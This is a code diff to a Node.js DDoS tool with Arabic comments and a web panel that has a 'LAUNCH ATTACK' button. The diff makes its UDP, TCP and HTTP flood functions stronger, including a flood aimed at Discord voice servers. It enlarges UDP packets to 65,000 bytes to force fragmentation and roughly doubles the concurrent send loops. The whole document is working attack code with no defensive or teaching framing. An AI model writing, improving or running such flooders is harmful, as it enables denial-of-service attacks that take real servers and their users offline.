@@ -10,14 +10,15 @@ app.use(express.json());
 
 let stats = { packets: 0, status: 'idle', target: '' };
 
-// ---------- هجوم ديسكورد الصوتي (UDP مكثف) ----------
+// ---------- هجوم ديسكورد الصوتي (UDP MAX BURST) ----------
 function discordVoiceFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
-    const payload = crypto.randomBytes(1400); // أقصى حجم حزمة لتجنب التقطيع
+    // أقصى حجم ممكن لحزمة UDP لتفتيت الحزم في الشبكة
+    const payload = crypto.randomBytes(65000); 
     
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 100; i++) {
             const client = dgram.createSocket('udp4');
             client.send(payload, 0, payload.length, port, target, () => {
                 stats.packets++;
@@ -26,8 +27,8 @@ function discordVoiceFlood(target, port, duration) {
         }
         setImmediate(loop);
     };
-    // 200 مسار متزامن لاستنزاف أقصى باندويث
-    for(let i=0; i<200; i++) loop();
+    // 500 مسار متزامن
+    for(let i=0; i<500; i++) loop();
 }
 
 // ---------- الهجمات الأخرى ----------
@@ -36,7 +37,7 @@ function udpFlood(target, port, duration) {
     const buffer = crypto.randomBytes(1024);
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 20; i++) {
+        for (let i = 0; i < 50; i++) {
             const client = dgram.createSocket('udp4');
             client.send(buffer, 0, buffer.length, port, target, () => {
                 stats.packets++;
@@ -45,14 +46,14 @@ function udpFlood(target, port, duration) {
         }
         setImmediate(loop);
     };
-    for(let i=0; i<50; i++) loop();
+    for(let i=0; i<100; i++) loop();
 }
 
 function tcpFlood(target, port, duration) {
     const endTime = Date.now() + duration * 1000;
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 20; i++) {
             const client = new net.Socket();
             client.setTimeout(2000);
             client.connect(port, target, () => {
@@ -65,7 +66,7 @@ function tcpFlood(target, port, duration) {
         }
         setTimeout(loop, 10);
     };
-    for(let i=0; i<20; i++) loop();
+    for(let i=0; i<40; i++) loop();
 }
 
 function httpFlood(target, port, duration, useHttps = false) {
@@ -73,7 +74,7 @@ function httpFlood(target, port, duration, useHttps = false) {
     const mod = useHttps ? https : http;
     const loop = () => {
         if (Date.now() > endTime) return;
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 20; i++) {
             const req = mod.request({
                 hostname: target, port: port, path: '/?' + crypto.randomBytes(4).toString('hex'),
                 method: 'GET',
@@ -86,9 +87,9 @@ function httpFlood(target, port, duration, useHttps = false) {
             req.on('error', () => {});
             req.end();
         }
-        setTimeout(loop, 10);
+        setTimeout(loop, 5);
     };
-    for(let i=0; i<20; i++) loop();
+    for(let i=0; i<40; i++) loop();
 }
 
 // ---------- API ----------
@@ -161,7 +162,7 @@ app.get('/', (req, res) => {
   </select>
   
   <label>Duration (Seconds)</label>
-  <input type="number" id="duration" value="60">
+  <input type="number" id="duration" value="30">
   
   <button onclick="launch()">LAUNCH ATTACK</button>
   
